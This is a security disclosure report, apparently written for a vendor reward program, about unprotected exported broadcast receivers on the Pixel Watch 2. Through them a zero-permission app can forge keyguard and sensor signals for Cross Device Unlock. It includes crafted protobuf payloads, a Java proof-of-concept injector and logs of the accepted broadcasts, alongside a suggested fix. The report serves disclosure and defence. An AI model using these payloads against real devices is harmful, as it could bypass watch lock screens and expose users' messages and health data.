# VRP Report 48: CrossDeviceAccessService Exported Receivers Accept Unauthorized Keyguard/Sensor Data Injection

## Summary

The `CrossDeviceAccessServiceAssociated2023` app (`com.google.android.crossdeviceaccessservice`) on Pixel Watch 2 exposes four broadcast receivers as `exported="true"` with **NO permission protection**. These receivers accept serialized protobuf payloads that feed directly into the Cross Device Unlock (CDU) trust decision system. A zero-permission malicious app can inject:

1. **Fake keyguard state** — telling CDU the companion phone is unlocked when it isn't
2. **Fake sensor data** — including on-body/off-body detection and heart rate
3. **Fake ranging capabilities** — spoofing UWB/BLE ranging data

This allows a zero-permission app to influence the Watch's trust-based unlock decisions, potentially bypassing the lock screen.

## Affected Component

- **Package**: `com.google.android.crossdeviceaccessservice`
- **APK**: `/system_ext/app/CrossDeviceAccessServiceAssociated2023/CrossDeviceAccessServiceAssociated2023.apk`
- **Vulnerable Receivers**:
  - `KeyguardEventReceiver` — accepts keyguard state changes
  - `SensorEventReceiver` — accepts sensor events (on-body, heart rate, proximity)
  - `RangingCapabilitiesEventReceiver` — accepts ranging capability events
  - `DebugBroadcastReceiver` — exported debug receiver (commands disabled in production, but receiver still exported)

## Affected Device

- **Device**: Google Pixel Watch 2 (eos)
- **Build**: CP2A.260603.001
- **Security Patch Level**: June 2026
- **Android Version**: 14 (Wear OS)

## Vulnerability Details

### Manifest Evidence

All four receivers are declared `exported="true"` with NO `android:permission` attribute:

```xml
<receiver android:directBootAware="true" android:enabled="true" android:exported="true"
    android:name="...KeyguardEventReceiver">
    <intent-filter>
        <action android:name="...ACTION_KEYGUARD_STATE_CHANGED_EVENT"/>
    </intent-filter>
</receiver>

<receiver android:enabled="true" android:exported="true"
    android:name="...SensorEventReceiver">
    <intent-filter>
        <action android:name="...ACTION_SENSOR_EVENT"/>
    </intent-filter>
</receiver>

<receiver android:enabled="true" android:exported="true"
    android:name="...RangingCapabilitiesEventReceiver">
    <intent-filter>
        <action android:name="...ACTION_RANGING_CAPABILITIES_EVENT"/>
    </intent-filter>
</receiver>

<receiver android:directBootAware="true" android:enabled="true" android:exported="true"
    android:name="...DebugBroadcastReceiver">
    <intent-filter>
        <action android:name="...ACTION_DEBUG_ANY_WATCH_NEARBY"/>
        <action android:name="...ACTION_DEBUG_GET_NODE_ID"/>
        <action android:name="...ACTION_DEBUG_IS_DEVICE_NEARBY"/>
        <action android:name="...ACTION_DEBUG_PROXIMITY_PROVIDER_AVAILABLE"/>
        <action android:name="...ACTION_DEBUG_PROXIMITY_PROVIDER_SUPPORTED"/>
    </intent-filter>
</receiver>
```

### Intended Permission Model

The app requests (but does NOT enforce on its receivers):
- `com.google.android.pixelsystemservice.crossdeviceaccessservice.permission.PROXY_BROADCAST`
- `com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.permission.PROXY_SENSOR_BROADCAST`

These permissions are intended to restrict which apps can send data TO CrossDeviceAccessService. However, because the receivers lack `android:permission` attributes, any app can send broadcasts to them.

**Contrast**: The `BluetoothBroadcastReceiver` in the same app correctly enforces permission — our test confirmed "Permission Denial" when sending `ACTION_STATE_CHANGED` from shell UID.

### Data Flow: Keyguard Injection

1. Receiver: `KeyguardEventReceiver`
2. Action: `com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT`
3. Extra key: `crossdeviceaccessservice.keyguard_event_data` (byte array)
4. Protobuf format: `CrossDeviceAccessServiceKeyguardEvent`
   - Field 1: `isKeyguardLocked` (bool) — whether the phone's lock screen is active
   - Field 2: `updateTimestamp` (Timestamp)
5. Data flows to: `SynchronizeKeyguardEventUser.synchronizeKeyguardEventTimeout()` → CDU trust decision

### Data Flow: Sensor Injection

1. Receiver: `SensorEventReceiver`
2. Action: `com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT`
3. Extra key: `crossdeviceaccessservice.sensor_event_data` (byte array)
4. Protobuf format: `CrossDeviceAccessServiceSensorEvent`
   - Field 1: `sensorType` (enum) — TYPE_LOW_LATENCY_OFFBODY_DETECT(34), TYPE_HEART_RATE(21), etc.
   - Field 2: `sensorTimestamp` (Timestamp)
   - Field 3: `sensorAccuracy` (enum)
   - Field 4: `sensorValues` (repeated float)
5. Data flows to: `SynchronizeSensorEventUser.synchronizeSensorEventTimeout()` → on-body detection for CDU

### Protobuf Payload Construction

**Keyguard "phone unlocked" payload** (10 bytes):
```
0x08 0x00  // field 1: isKeyguardLocked = false (phone unlocked)
0x12 0x06  // field 2: timestamp (length 6)
0x08 [5-byte varint: seconds since epoch]
```

**On-body sensor payload** (18 bytes):
```
0x08 0x22  // field 1: sensorType = 34 (LOW_LATENCY_OFFBODY_DETECT)
0x12 [timestamp]
0x18 0x03  // field 3: accuracy = SENSOR_STATUS_ACCURACY_HIGH
0x22 0x04  // field 4: packed float values
0x00 0x00 0x80 0x3F  // 1.0f = on-body
```

## Impact

- **Severity**: HIGH (Integrity — Trust Manipulation + Potential Lock Screen Bypass)
- **Attack vector**: Local (installed app, zero permissions required)
- **User interaction**: None
- **Scope**: Cross Device Unlock trust decisions

### Attack Scenario

1. Malicious app installs on Pixel Watch (no permissions needed)
2. App runs in foreground (visible Activity — standard for Watch apps)
3. App sends crafted broadcasts to:
   a. `KeyguardEventReceiver` with `isKeyguardLocked=false` → CDU thinks phone is unlocked
   b. `SensorEventReceiver` with `TYPE_LOW_LATENCY_OFFBODY_DETECT, value=1.0` → CDU thinks Watch is on wrist
4. CDU trust agent (`CduTrustAgentService`) receives false data about phone unlock state and wrist detection
5. Watch may grant trust (unlock) based on forged signals

### Impact Chain

- **Integrity**: Fake keyguard/sensor data feeds into trust decisions
- **Authentication**: CDU trust agent may bypass lock screen based on injected data
- **Availability**: Fake off-body detection could force the Watch to lock unexpectedly
- **Privacy**: If CDU unlocks the Watch, attacker gains access to notifications, health data, messages

## Proof of Concept

### PoC App (CDUInject2.java — app_process based)

```java
import android.content.ComponentName;
import android.content.Intent;
import android.content.Context;
import java.io.ByteArrayOutputStream;

public class CDUInject2 {
    public static void main(String[] args) throws Exception {
        // ... (ActivityThread setup)
        String targetPkg = "com.google.android.crossdeviceaccessservice";

        // Inject fake "phone unlocked" state
        byte[] keyguardPayload = buildKeyguardProto(false);
        Intent intent = new Intent("...ACTION_KEYGUARD_STATE_CHANGED_EVENT");
        intent.setComponent(new ComponentName(targetPkg,
            "...KeyguardEventReceiver"));
        intent.putExtra("crossdeviceaccessservice.keyguard_event_data", keyguardPayload);
        ctx.sendBroadcast(intent);

        // Inject fake "watch on wrist" sensor
        byte[] sensorPayload = buildSensorProto(34, 3, 1.0f);
        Intent intent2 = new Intent("...ACTION_SENSOR_EVENT");
        intent2.setComponent(new ComponentName(targetPkg,
            "...SensorEventReceiver"));
        intent2.putExtra("crossdeviceaccessservice.sensor_event_data", sensorPayload);
        ctx.sendBroadcast(intent2);
    }
}
```

### Dynamic Evidence

**Broadcast acceptance** (no SecurityException from shell UID 2000):
```
=== CDU Explicit Broadcast Injection PoC ===
UID: 2000

--- Test 1: EXPLICIT keyguard unlock injection ---
  SENT: isKeyguardLocked=false (10 bytes)
  Payload: 0800120608fcf288d506

--- Test 2: EXPLICIT on-body sensor injection ---
  SENT: LOW_LATENCY_OFFBODY_DETECT, value=1.0 (18 bytes)
  Payload: 0822120608fdf288d506180322040000803f

--- Test 5: EXPLICIT fake state change injection ---
  ERROR: Permission Denial: not allowed to send broadcast
  [Note: BluetoothBroadcastReceiver correctly enforces permission; keyguard/sensor do NOT]
```

**Broadcast enqueue evidence** (ActivityManager accepted the broadcasts):
```
09-10 10:31:43.770 ActivityManager: Broadcasting: Intent {
  act=...ACTION_KEYGUARD_STATE_CHANGED_EVENT flg=0x400000
  cmp=com.google.android.crossdeviceaccessservice/.KeyguardEventReceiver }
09-10 10:31:43.772 ActivityManager: Enqueued broadcast: 0
```

**Contrast with properly-gated BluetoothBroadcastReceiver**:
```
Permission Denial: not allowed to send broadcast
  ...ACTION_STATE_CHANGED from pid=4106, uid=2000
```

This proves: the system enforces permissions on OTHER receivers in the same app, but KeyguardEventReceiver and SensorEventReceiver are unprotected.

## Suggested Fix

1. Add `android:permission` attribute to `KeyguardEventReceiver`, `SensorEventReceiver`, and `RangingCapabilitiesEventReceiver`:
   ```xml
   <receiver android:exported="true"
       android:permission="com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.permission.PROXY_SENSOR_BROADCAST"
       android:name="...SensorEventReceiver">
   ```
2. Make `DebugBroadcastReceiver` `exported="false"` since debug commands are disabled in production
3. Validate the sender UID in receiver code as defense-in-depth

## Files

- **PoC source**: `poc_shell/CDUInject2.java`
- **Decompiled receivers**: `deep_analysis/crossdevice_decompiled/sources/com/google/android/crossdeviceaccessservice/associated/shared/data/infrastructure/`
- **Manifest**: `deep_analysis/crossdevice_manifest/AndroidManifest.xml`
- **Protobuf definitions**: `deep_analysis/crossdevice_decompiled/sources/com/google/android/crossdeviceaccessservice/associated/shared/protos/`
